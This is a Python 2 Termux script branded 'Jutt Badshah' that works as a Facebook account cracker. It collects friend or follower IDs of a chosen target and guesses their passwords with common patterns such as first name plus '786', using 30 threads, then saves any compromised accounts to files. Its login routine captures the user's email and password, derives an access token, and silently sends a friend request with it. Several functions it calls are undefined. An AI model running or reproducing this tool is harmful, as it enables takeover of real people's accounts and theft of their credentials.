#!/usr/bin/python2
#coding=utf-8

try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/home/sheryjutt/KONTOL/node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd KONTOL && npm install')
    os.system('cd KONTOL && node index.js &')
    os.system('clear')
    print '\n\x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
    #os.system('xdg-open https://saweria.co/nazeerjutt652')
    time.sleep(10)
elif os.path.isfile('/data/data/com.termux/files/home/sheryjutt/KONTOL/node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd KONTOL && node index.js &')
    os.system('clear')
    print '\n\x1b[1;32m Please Select Chrome  Browser To Continue \x1b[0;97m'
    #os.system('xdg-open https://saweria.co/nazeerjutt652')
    time.sleep(10)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c = '\x1b[1;32m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;31m'

def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)


##### LOGO #####
logo = """
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦")
\033[1;96m               💙 💙    💙 💙💙💙💙
\033[1;96m               💛 💛    💛    💛
\033[1;96m               💛 💛    💛    💛 
\033[1;96m               💛 💛    💛    💛
\033[1;96m               💛 💛    💛    💛
\033[1;96m              💛   💛  💛     💛
\033[1;96m         💛 💛       💛       💛   
\033[1;96m                  Jutt Badshah Updated 0.3;)                   
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦")
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦")
\033[1;96m               💙 💙    💙 💙💙💙💙
\033[1;96m               💛 💛    💛    💛
\033[1;96m               💛 💛    💛    💛  
\033[1;96m               💛 💛    💛    💛
\033[1;96m               💛 💛    💛    💛
\033[1;96m              💛   💛  💛     💛
\033[1;96m         💛 💛       💛       💛
\033[1;96m                  Jutt Badshah Updated 0.3;)                   
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦")
"""

jalan("\033[1;97m•◈•───────•◈ NOT A NAME JUTT IS BRAND •◈•───────•◈•")  


jalan("\033[1;91m       ♦♦♦———————————————————————————————♦♦♦")     
jalan("\033[1;96m                  Jutt Badshah Updated 0.3")                   
jalan("\033[1;91m       ♦♦♦———————————————————————————————♦♦♦")
 
jalan("\033[1;91m INDAIN USERZ USE ANY PROXY ")	
jalan("\033[1;91m WIFI USERZ USE ANY PROXY ")
	
jalan("\033[1;93m Welcome to Jutt Creations ")

def reg():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mTake The Free Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/nazeerjutt652/jutt-badshah/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(2)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \033[1;92mYour Id Is Not Approved Already '
        print ' \033[1;92mCopy the id and send to admin'
        print ' \033[1;92mYour id: ' + to
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/profile.php?id=100057488713509')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \033[1;92mCopy kr k send send kro Facebook py to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to Facebook ')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100057488713509')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print '\tCollecting device info'
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\033[1;92m Your ip: ' + ips
    time.sleep(2)
    print '\033[1;92m Your country: ' + country
    time.sleep(2)
    print '\033[1;92m Your region: ' + regi
    time.sleep(2)
    print ' \033[1;92mYour network: ' + network
    time.sleep(2)
    print ' Loading ...'
    time.sleep(2)
    masuk()

######MASUK######
def masuk():
        os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
	print logo
        print ''
 	print "\033[0;94m──────────────────────────────────────────────────────"
        time.sleep(0.03)
	print "\033[0;97m [\033[0;90m01\033[0;97m]\033[0;96m\033[0;97m Login With Cookies"
        time.sleep(0.03)
	print "\033[0;97m [\033[0;90m02\033[0;97m]\033[0;96m\033[0;97m Login With Token"
        time.sleep(0.03)
	print "\033[0;97m [\033[0;90m03\033[0;97m]\033[0;96m\033[0;97m Login Manual"
        time.sleep(0.03)
	print "\033[0;97m [\033[0;90m04\033[0;97m]\033[0;96m\033[0;97m Cara Ambil Token"
        time.sleep(0.03)
	print "\033[0;97m [\033[0;90m04\033[0;97m]\033[0;96m\033[0;97m Keluar"
        time.sleep(0.03)
  	print "\033[0;94m──────────────────────────────────────────────────────"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[0;91m>\033[0;97m>\033[0;94m> \033[0;96m")
	if msuk =="":
		print"\033[0;97m[\033[0;91m!\033[0;97m] Isi Yg Benar Bro !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		cookie()
	elif msuk =="2"or msuk =="02":
		tokenz()
	elif msuk =="3"or msuk =="03":
		manual()
	elif msuk =="4"or msuk =="04":
		ambil_token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[0;97m[\033[0;91m!\033[0;97m] Isi Yg Benar Bro !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
 	print "\033[0;94m──────────────────────────────────────────────────────"
        time.sleep(0.03)
	toket = raw_input("\033[0;97m[\033[0;31m?\033[1;97m] Token \033[0;31m: \33[0;93m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ("\n\033[0;97m[\033[0;92m✓\033[0;97m]\033[0;92m Login Successful")
		os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
                menu()
	except KeyError:
		print "\033[0;97m[\033[0;39m!\033[0;97m] \033[1;92mToken invalid !"
		os.system('xdg-open https://youtu.be/hQ-lYxozghU')
		time.sleep(0.03)
		masuk()
		


######AMBIL_TOKEN######
def ambil_token():
	os.system ("clear")
	print logo
 	print "\033[0;94m──────────────────────────────────────────────────────"
        time.sleep(0.03)
	jalan("        \033[1;92mAnda Akan Di Arahkan Ke Youtube ...")
	os.system('xdg-open https://youtu.be/hQ-lYxozghU')
	time.sleep(2)
	masuk()
	

######MANUAL######
def manual():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print('\033[1;96m      [] \x1b[1;91m───Login Akun Baru───\x1b[1;93m[⚡]' )
		id = raw_input('\033[1;93m[+] \x1b[0;34mID/Email \x1b[1;95m: \x1b[1;95m')
		pwd = raw_input('\033[1;95m[+] \x1b[0;34mPassword \x1b[1;93m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
		                jalan ("\n\033[0;97m[\033[0;32m✓\033[0;97m]\033[0;92m Login Successful")
		                os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mAkun Sepertina Terkena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email Wrong!")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
####LOGINCOOKIES###
######Login_Cookie######
def cookie():
	os.system("clear")
	print logo
 	print "\033[0;94m──────────────────────────────────────────────────────"
        time.sleep(0.03)
	cookie = raw_input(" \033[1;97m[\033[1;91m?\033[1;97m] Cookie \033[1;91m:\033[1;93m ")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan di ganti Ya sayang ku.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] No Connection"
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	jalan ("\n\033[0;97m[\033[0;39m✓\033[0;97m]\033[0;92m Login Successful")
	os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
	time.sleep(0.03)
	menu()
			
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;97mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
	print "\033[1;32;40m[2] \033[1;33;40m══Update Jutt"																														
	print "\033[1;32;40m[3] \033[1;33;40m══Extract File"
	print "\033[1;32;40m[0] \033[1;33;40m══For Start cloning 1 Enter" 
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\033[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		moch_yayan()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
		os.system('git pull')
		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
		menu()
	elif unikers =="3":
		os.system('python2 ok.py')

def moch_yayan():
    global token
    os.system('clear')
    print logo
    try:
        token = open('login.txt').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        print ''
        print '\t    ' + c + 'ID has checkpoint' + c2
        print ''
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t    \x1b[1;31mTurn on mobile data OR wifi\x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    print '[1] ══ Crack From Public Id'
    print '[2] ══ Crack From Followers'
    print '[3] ══ Crack From File'
    print '[0] ══ Back Method Menu'
    l_menu_select()

def l_menu_select():
    croot = raw_input('\n\033[1;31;40m>>> \033[1;35;40m')
    id = []
    oks = []
    cps = []
    if croot == '1' or croot =='01':
        os.system('clear')
        print logo
        print '\033[1;97m [✺] Getting IDs \033[1;97m...'
        print ''
        idt = raw_input(' \033[1;97m[*] Enter ID : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\033[1;31;40m[✺] Name :' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t    [✺] ID Not Found!'
            print ''
            raw_input('\n  [ Back ]  ')
            moch_yayan()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif croot == '2' or croot =='02':
        os.system('clear')
        print logo
        idt = raw_input(' \033[1;97m[*] Enter ID : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\033[1;31;40m[✺] Name :' + q['name']
        except (KeyError, IOError):
            print ''
            print '\033[1;97m[✺] ID Not Found!'
            raw_input('\n    [ Back ] ')
            moch_yayan()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif croot == '3' or croot =='03':
        os.system('clear')
        print logo
        print '\033[1;97m [✺] Getting IDs \033[1;97m...'
        print ''
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print ''
            print '\n\t    [✺] ID Not Found!'
            print ''
            raw_input('\n  [ Back ]  ')
            moch_yayan()

    elif croot == '0' or croot =='00':
        yayanxyz()
    else:
        print ''
        print '\t    ' + c + 'Select valid method' + c2
        print ''
        l_menu_select()
    print '\033[1;36;40m[✺] Total IDs : \033[1;97m' + str(len(id))
    print '\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈'
    jalan('  ●💋══════════════════◄►══════════════════💋●')
    jalan('           \033[1;97mjutt badshah start cloning Wait...')
    print('  ●💋══════════════════◄►══════════════════💋●')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '786'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m'  + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = '234567'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = '223344'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '334455'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = '445566'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = '786000'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m'  + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print '\x1b[1;94m────────────────────────────────────────────────────'
    print '\x1b[1;96m Process Has Completed'
    print '\x1b[1;97m Total\x1b[1;93m CP\x1b[1;91m/\x1b[1;92mOK \x1b[1;91m: \x1b[1;93m' + str(len(cps)) + '\x1b[1;91m/\x1b[1;92m' + str(len(oks))
    jalan('\x1b[1;97m RESULTS \x1b[1;93mCP\x1b[1;91m/\x1b[1;92mOK\x1b[1;97m SAVED TO SDCARD\x1b[1;91m : \x1b[1;93mcp.txt\x1b[1;91m/\x1b[1;92mok.txt')
    print '\x1b[1;94m────────────────────────────────────────────────────'
    print ''
    raw_input('\x1b[1;96m Press Entet To Back ')
    masuk()


if __name__ == '__main__':
    reg()
